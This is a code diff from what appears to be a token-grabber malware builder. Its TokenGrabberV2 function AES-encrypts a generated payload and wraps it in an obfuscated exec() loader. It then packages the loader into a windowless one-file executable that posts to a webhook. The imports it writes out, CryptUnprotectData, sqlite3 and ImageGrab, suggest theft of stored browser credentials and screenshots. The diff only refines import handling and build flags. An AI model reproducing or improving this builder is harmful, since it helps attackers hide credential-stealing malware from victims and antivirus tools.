@@ -38,12 +38,18 @@ def TokenGrabberV2(WebHook, fileName):
         for i in range(8):
             key = key + chr(random.randint(0x4E00, 0x9FA5))
 
-        with open(f'{fileName}.py') as f: _file = f.read()
+        with open(f'{fileName}.py') as f: 
+            _file = f.read()
+            imports = ''
+            input_file = _file.splitlines()
+            for i in input_file:
+                if i.startswith("import") or i.startswith("from"):
+                    imports += i+';'
 
         with open(f'{fileName}.py', "wb") as f:
             encodedBytes = base64.b64encode(_file.encode())
             obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
-            f.write(f'import requests;import os;import shutil;import sqlite3;import zipfile;import json;import base64 ;import psutil;from PIL import ImageGrab;from win32crypt import CryptUnprotectData;from re import findall;from Crypto.Cipher import AES;exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
+            f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
 
     print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
     setTitle(f"Creating {fileName}.exe")
@@ -52,6 +58,7 @@ def TokenGrabberV2(WebHook, fileName):
         '%s.py' % fileName,
         '--name=%s' % fileName,
         '--onefile',
+        '--clean',
         '--noconsole',
         '--log-level=INFO',
         '--icon=NONE',
